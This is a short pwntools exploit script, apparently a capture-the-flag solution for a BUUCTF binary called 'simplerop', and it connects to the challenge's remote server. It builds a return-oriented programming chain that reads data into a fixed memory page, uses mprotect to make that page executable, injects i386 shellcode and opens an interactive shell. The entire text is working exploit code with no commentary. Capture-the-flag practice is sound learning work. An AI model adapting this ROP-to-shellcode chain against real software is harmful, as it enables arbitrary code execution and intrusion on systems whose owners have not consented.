from pwn import *
elf = ELF('./simplerop')

sh = elf.process()
sh = remote('node3.buuoj.cn', 28192)
mprotect = elf.sym['mprotect']
read = elf.sym['read']
mem = 0x80e9000
pop3_ret = 0x0804838c

payload = p32(mem) * 8

payload += p32(read)
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(mem)
payload += p32(0x100)

payload += p32(mprotect)
payload += p32(pop3_ret)
payload += p32(mem)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(mem)

sh.recv()
sh.sendline(payload)

payload_sh = asm(shellcraft.i386.sh(), arch = 'i386', os = 'linux')
sh.sendline(payload_sh)

sh.interactive()
